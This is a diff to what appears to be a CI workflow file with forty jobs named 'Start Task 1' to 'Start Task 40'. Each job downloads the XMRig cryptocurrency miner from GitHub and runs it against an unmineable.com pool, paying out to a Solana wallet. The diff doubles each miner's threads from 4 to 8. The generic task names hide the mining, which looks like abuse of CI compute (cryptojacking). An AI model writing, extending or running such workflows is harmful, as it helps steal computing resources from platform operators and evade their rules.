@@ -17,7 +17,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_2:
     name: Start Task 2
@@ -30,7 +30,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_3:
     name: Start Task 3
@@ -43,7 +43,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_4:
     name: Start Task 4
@@ -56,7 +56,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_5:
     name: Start Task 5
@@ -69,7 +69,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_6:
     name: Start Task 6
@@ -82,7 +82,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_7:
     name: Start Task 7
@@ -95,7 +95,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_8:
     name: Start Task 8
@@ -108,7 +108,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_9:
     name: Start Task 9
@@ -121,7 +121,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_10:
     name: Start Task 10
@@ -134,7 +134,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_11:
     name: Start Task 11
@@ -147,7 +147,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_12:
     name: Start Task 12
@@ -160,7 +160,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_13:
     name: Start Task 13
@@ -173,7 +173,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_14:
     name: Start Task 14
@@ -186,7 +186,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_15:
     name: Start Task 15
@@ -199,7 +199,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_16:
     name: Start Task 16
@@ -212,7 +212,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_17:
     name: Start Task 17
@@ -225,7 +225,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_18:
     name: Start Task 18
@@ -238,7 +238,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_19:
     name: Start Task 19
@@ -251,7 +251,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_20:
     name: Start Task 20
@@ -264,7 +264,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_21:
     name: Start Task 21
@@ -277,7 +277,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_22:
     name: Start Task 22
@@ -290,7 +290,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_23:
     name: Start Task 23
@@ -303,7 +303,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_24:
     name: Start Task 24
@@ -316,7 +316,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_25:
     name: Start Task 25
@@ -329,7 +329,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_26:
     name: Start Task 26
@@ -342,7 +342,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_27:
     name: Start Task 27
@@ -355,7 +355,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_28:
     name: Start Task 28
@@ -368,7 +368,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_29:
     name: Start Task 29
@@ -381,7 +381,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_30:
     name: Start Task 30
@@ -394,7 +394,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_31:
     name: Start Task 31
@@ -407,7 +407,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_32:
     name: Start Task 32
@@ -420,7 +420,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_33:
     name: Start Task 33
@@ -433,7 +433,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_34:
     name: Start Task 34
@@ -446,7 +446,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_35:
     name: Start Task 35
@@ -459,7 +459,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_36:
     name: Start Task 36
@@ -472,7 +472,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_37:
     name: Start Task 37
@@ -485,7 +485,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_38:
     name: Start Task 38
@@ -498,7 +498,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_39:
     name: Start Task 39
@@ -511,7 +511,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
 
   start_task_40:
     name: Start Task 40
@@ -524,4 +524,4 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=8
